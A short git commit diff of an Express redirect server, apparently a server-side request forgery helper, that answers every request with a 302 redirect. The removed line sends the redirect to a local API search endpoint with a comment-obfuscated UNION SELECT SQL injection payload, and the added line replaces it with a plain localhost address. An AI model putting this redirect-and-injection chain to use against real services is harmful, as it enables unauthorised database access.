d84005f20929523d00da0f87e8d8ec08cf77b56a
Luks <51793738+0xLuks@users.noreply.github.com>
2022-08-23 18:00:06 +0200

    Update index.js

--- JS/HTTP_redirect_server/index.js
+++ JS/HTTP_redirect_server/index.js
@@ -3,13 +3,13 @@
 const express = require('express');
 const app = express();
 const port = 3000;
-const host = "127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/select/**/1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
+const host = "127.0.0.1:3000/"
 
 app.get("/", (req,res) => {
-	res.redirect(302, `http://${host}:${port}`);
+    res.redirect(302, `http://${host}:${port}`);
 });
 
 app.listen(port, () => {
-	console.log(`Listening on port 80`);
-    	app.listen(80);
+    console.log(`Listening on port 80`);
+    app.listen(80);
 });
